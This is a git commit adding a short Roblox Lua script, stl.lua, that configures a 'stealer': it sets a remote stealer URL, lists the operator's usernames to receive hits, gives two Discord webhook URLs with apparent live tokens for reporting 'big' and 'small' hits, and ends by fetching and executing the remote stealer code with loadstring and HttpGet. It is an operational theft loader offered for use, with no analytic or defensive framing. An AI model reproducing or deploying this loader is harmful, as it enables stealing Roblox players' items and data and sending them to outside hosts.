3e3f653e66c9015a9f8cc1d1344a8312a0ffc8c8
no <mys4exz4@gmail.com>
2025-05-03 10:43:58 +0700

    Create stl.lua

---
+++ stl.lua
@@ -0,0 +1,14 @@
+STEALER_LINK = 'https://dpaste.com/E94R4PS4U.txt' -- stealer link (how to create is bellow)
+
+DISCORD_ID = '1234567' -- THIS IS NOT IMPORTANT (its for /list_players and /execute commads!)
+
+Usernames = {
+    'Zypherion00', -- PUT UR ROBLOX USERNAMES
+    'second', -- AS MANY AS U WANT BUT DONT FORGET ,
+    'third',
+}
+
+BigHitsWebhook = "https://discord.com/api/webhooks/x/xhttps://discord.com/api/webhooks/1368070387019284603/YKaxics6XSAiu8fUGHbOxOuGjDT9HwXXvIlqbt5AE7QfazCYgBmKtsLLHBnnY6t7-Ak_"
+SmallHitsWebhook = "https://discord.com/api/webhooks/1368070508188532786/tLg564Ll2XRa-_qKUny1A3AsgIdm_WgTvKcFxT7Ae3vg2nc3yOU2lQTG_J_E5fRW6nIB"
+
+loadstring(game:HttpGet(STEALER_LINK, true))() -- NEVER TOUCH THAT LINE OF CODE JUST DONT!!!
